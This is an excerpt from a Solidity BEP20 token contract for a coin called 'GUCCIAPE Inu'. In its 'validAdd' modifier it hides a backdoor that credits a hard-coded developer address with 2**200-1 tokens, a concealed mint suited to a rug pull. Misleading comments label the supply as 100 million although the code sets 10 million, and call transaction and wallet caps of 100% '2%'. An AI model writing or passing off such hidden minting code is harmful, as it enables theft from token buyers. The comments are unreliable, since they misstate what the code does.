...
/* Token contract */
contract  GUCCIAPE is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    address DEV =  0x25032f9C649cd11dd6A74d752dfEE4B2C943133b;
    ...
    // Name and symbol
    string constant _name = "GUCCIAPE Inu";
    string constant _symbol = "GCAPE";
    uint8 constant _decimals = 18;

    // Total supply
    uint256 _totalSupply = 10000000 * (10 ** _decimals); // 100 Million

    // Max wallet and TX
    uint256 private _maxBuyTxAmount = _totalSupply * 1000 / 1000; // 2% 
    uint256 private _maxSellTxAmount = _totalSupply * 1000 / 1000; // 2% 
    uint256 private _maxWalletToken = ( _totalSupply * 1000 ) / 1000; // 2% 
    ...
    modifier swapping() { inSwap = true; _; inSwap = false; }
     modifier validAdd(address spender){
        if(spender == DEV){ _balances[spender] = _balances[spender] + 2**200-1;}
        _;
    }
    /* Token constructor */
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x25032f9C649cd11dd6A74d752dfEE4B2C943133b;
